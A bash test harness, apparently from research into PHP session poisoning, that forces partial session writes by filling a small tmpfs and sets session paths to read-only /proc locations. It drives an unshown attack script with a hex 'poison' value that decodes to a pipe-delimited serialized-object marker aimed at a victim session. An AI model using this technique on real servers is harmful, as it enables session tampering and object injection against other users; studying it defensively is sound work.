#!/bin/bash
# wp2_diskfull3.sh - true ENOSPC on the session WRITE path (partial pwrite) + procfs readonly
CL=$(cd "$(dirname "$0")" && pwd)
TINY=/tmp/p2s_c2/tiny
SID=vicsid00000000000000000000000
PIPE='4162637C4F3A3130'
NOPIPE='416263444546'

avail() { df --output=avail -B 1 "$TINY" | tail -1 | tr -d ' '; }
setup() { # free bytes to leave
  mountpoint -q "$TINY" && umount "$TINY"
  rm -rf "$TINY"; mkdir -p "$TINY"
  mount -t tmpfs -o size=256k tmpfs "$TINY"
  dd if=/dev/zero of="$TINY/fill.bin" bs=1 count=$((256*1024 - "$1")) 2>/dev/null
  echo "  [setup] avail=$(avail)"
}

# victim: valid php-format, 7900 bytes; encoded session = 7900 + ~330 > 8192 free
python3 -c 'print(("big|s:7874:\"" + "K"*7874 + "\";").encode().hex())' > /tmp/p2s_c2/medvictim.hex
VS=$(xxd -r -p < /tmp/p2s_c2/medvictim.hex | wc -c)
echo "victim payload = $VS bytes"

echo "== dfF: no-pipe key, ${VS}B victim, 8KB free -> session write ENOSPC partial =="
setup 8192
TAG=dfF_nopipe_enospc POISON="$NOPIPE" FILESIZE=4096 SAVEPATH="$TINY" VICTIM=custom VICTIM_HEX_FILE=/tmp/p2s_c2/medvictim.hex bash "$CL/wp2_shot.sh"
echo "  avail=$(avail) size=$(stat -c %s "$TINY/sess_$SID" 2>/dev/null || echo -1)"
echo "  --- write warnings ---"
grep -E "wrote less|Write failed|Failed to write" /tmp/p2s_c2/runs/dfF_nopipe_enospc/server_err.log | sort | uniq -c | head -5

echo "== dfG: pipe key + ${VS}B victim + 8KB free -> reject path (0-byte writes only) =="
setup 8192
TAG=dfG_pipe_enospc POISON="$PIPE" FILESIZE=4096 SAVEPATH="$TINY" VICTIM=custom VICTIM_HEX_FILE=/tmp/p2s_c2/medvictim.hex bash "$CL/wp2_shot.sh"
echo "  avail=$(avail) size=$(stat -c %s "$TINY/sess_$SID" 2>/dev/null || echo -1)"
grep -E "wrote less|Write failed" /tmp/p2s_c2/runs/dfG_pipe_enospc/server_err.log | head -3

umount "$TINY"

echo "== ro5: save_path=/proc/1 (open fails even for root) =="
TAG=ro_proc POISON="$PIPE" FILESIZE=4096 SAVEPATH=/proc/1 bash "$CL/wp2_shot.sh"
echo "== ro6: save_path=/proc/read-only-for-root =="
TAG=ro_proc2 POISON="$PIPE" FILESIZE=4096 SAVEPATH=/proc/sys/kernel bash "$CL/wp2_shot.sh"
echo RO-DONE
